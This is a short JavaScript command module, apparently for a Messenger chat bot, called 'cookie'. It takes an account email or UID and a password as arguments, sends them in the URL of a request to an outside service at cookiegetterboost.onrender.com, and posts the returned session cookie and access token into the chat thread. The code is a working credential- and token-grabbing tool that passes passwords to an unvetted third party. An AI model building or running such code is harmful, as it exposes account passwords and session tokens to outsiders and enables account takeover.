module.exports.config = {
  name: 'cookie',
  version: '1.0',
  role: 0,
  hasPrefix: true,
  description: 'get cookie and token',
  usage: '[email/num/uid] [password]',
  aliases: [],
  credits: 'aze',
  cooldown: 0 
};

module.exports.run = async function ({ api, args, event }) {
  async function send(api, message, threadID, messageID) {
    api.sendMessage(message, threadID, messageID);
  }

  const email = args[0];
  const password = args[1];

  if (!email || !password || (!email && !password)) {
    return send(api, 'Invalid arguments! Usage: cookie [email/phone/uid] [password]');
  }

  try {
    const response = await fetch(`https://cookiegetterboost.onrender.com/get_cookie?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
    const data = await response.json();

    if (data.cookie) {
      const cookie = data.cookie;
      const token = data.access_token;
      send(api, `Cookie:\n${cookie}\n\nAccess Token:\n${token}`);
    } else {
      const errorMessage = data.message || 'Error fetching data.';
      send(api, `Error: ${errorMessage}`);
    }
  } catch (error) {
    send(api, `An error occurred: ${error.message}`);
  } 
};